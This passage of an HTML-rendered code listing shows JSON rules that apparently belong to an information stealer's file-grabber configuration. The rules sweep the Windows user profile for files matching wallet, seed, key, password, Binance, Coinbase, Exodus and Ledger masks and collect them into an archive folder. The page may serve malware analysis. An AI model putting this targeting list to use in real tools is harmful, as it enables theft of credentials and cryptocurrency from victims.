class=&#34;line&#34;&gt;411&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;412&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;413&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;414&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;415&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;416&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;417&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;418&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;419&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;420&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;421&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;422&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;423&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;424&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;425&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;426&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;427&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;428&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;429&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;430&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;431&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;432&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;433&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;434&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;435&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;436&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;437&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;438&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;439&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;440&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;441&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;442&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;443&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;445&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;446&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;447&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;448&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;449&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;450&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;451&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;452&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;453&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;454&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;455&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;456&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;457&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;458&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;459&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;460&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;461&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;462&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;463&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;464&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;465&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;466&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;467&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;468&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;469&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;470&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;471&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;472&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;473&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;474&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;475&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;476&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;477&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;478&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;479&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;480&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;481&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;482&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;483&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;484&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;485&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;486&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;487&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;488&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;489&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;490&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;491&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;492&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attr&#34;&gt;&amp;quot;v&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;attr&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;punctuation&#34;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*.txt&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*key*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*bitcoin*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*binance*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*exodus*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*coinbase*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*wallet*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*seed*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*pass*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;t&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;%userprofile%&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;m&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;*ledger*&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;z&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Important Files/Profile&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;attr&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt;&lt;span 